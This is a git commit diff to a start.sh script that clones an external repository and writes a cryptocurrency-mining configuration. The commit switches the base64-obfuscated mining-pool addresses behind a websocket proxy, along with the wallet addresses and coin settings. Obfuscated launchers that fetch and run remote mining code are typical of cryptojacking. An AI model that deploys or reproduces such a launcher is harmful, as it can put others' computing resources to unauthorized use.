0d1de2b798277ad22ba143157f19a8ea17fdc29d
duongpokeeeee <duongytpre253@gmail.com>
2025-04-03 15:58:51 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -4,9 +4,9 @@ MIN=$1
 git clone https://github.com/mom742886/nano-mbc
 cd nano-mbc
 echo '{
-  "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
-  "config": { "threads": 7, "log": true },
-  "options": { "user": "0xC4C2ca6D265f353972a26B8c8Df5FF4c1C000D7D", "password": "c=USDT-BEP20", "argent": "web-wasm/1.0" }
+  "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
+  "config": { "threads": 6, "log": true },
+  "options": { "user": "RFikJQEPWj7hveHt9G8wwLfufEmDagoRf4", "password": "c=RVN", "argent": "web-wasm/1.0" }
 }' > data.json
 
 while true; do
